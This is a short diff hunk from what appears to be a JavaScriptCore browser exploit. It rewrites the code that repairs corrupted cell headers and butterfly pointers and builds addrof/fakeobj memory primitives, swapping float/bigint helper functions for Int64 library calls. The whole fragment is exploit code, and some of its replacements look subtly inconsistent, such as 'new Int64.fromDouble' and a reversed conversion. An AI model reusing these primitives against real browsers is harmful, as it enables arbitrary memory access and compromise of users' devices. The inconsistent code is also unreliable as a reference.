@@ -509,18 +509,18 @@ var VM_PROT_EXECUTE = 0x4
             port.postMessage("double array header1: " + doubleArrayCellHeader.toString(16));
             //fakeArr[0] = new Int64(0x414141414141).asDouble()
             // fix broken cell header
-            fakeArr[0] = bigint2float(doubleArrayCellHeader);
+            fakeArr[0] = new Int64.fromDouble(doubleArrayCellHeader);
             // grab a real butterfly pointer
-            let doubleArrayButterfly = float2bigint(fakeArr[1]);
+            let doubleArrayButterfly = new Int64(fakeArr[1]).asDouble();
             // fix other broken cell header
             obj.fakeButterfly = b0;
-            fakeArr[0] = bigint2float(doubleArrayCellHeader);
+            fakeArr[0] = new Int64.fromDouble(doubleArrayCellHeader);
             // fix the broken butterflys and setup cleaner addrof / fakeobj
-            obj.jsCellHeader = bigint2float(unboxDouble(doubleArrayCellHeader));
+            obj.jsCellHeader = new Int64.fromDouble(Sub(doubleArrayCellHeader,new Int64("0x0002000000000000")));
             obj.fakeButterfly = a1;
-            fakeArr[1] = bigint2float(doubleArrayButterfly);
+            fakeArr[1] = new Int64.fromDouble(doubleArrayButterfly);
             obj.fakeButterfly = b1;
-            fakeArr[1] = bigint2float(doubleArrayButterfly);
+            fakeArr[1] = new Int64.fromDouble(doubleArrayButterfly);
             fakeobj = (addr) => {
               a1[0] = new Int64(addr).asDouble();
               return b1[0];
